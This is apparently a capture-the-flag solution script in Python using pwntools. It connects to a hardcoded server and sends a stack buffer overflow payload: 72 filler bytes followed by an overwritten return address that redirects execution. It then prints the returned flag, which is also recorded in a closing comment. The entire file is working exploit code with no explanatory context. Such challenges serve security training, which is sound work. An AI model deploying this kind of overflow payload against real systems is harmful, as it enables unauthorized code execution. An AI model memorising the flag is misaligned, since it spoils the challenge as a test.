#!/usr/bin/python3

from pwn import remote
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)

server_ip = "140.113.207.246"
target_pt = 20224

rmt = remote(server_ip, target_pt)
rmt.recvuntil('Hey! Do you know how to telesport? Try to put a spell!')
rmt.recvuntil('Your spell: ')


msg = bytes([23 for i in range(72)])
msg = msg + b'\xb6\x11\x40\x00'

print("Sending... ", len(msg), "bytes data", end = "\n\n")
rmt.sendline(msg)

# Flag
result = rmt.recvrepeat().decode().split('\n')
print(result[0])

print("\n")
for i in result[1:]:
	print(i)


# CSC2022{aV@D4_K3D@vR4}
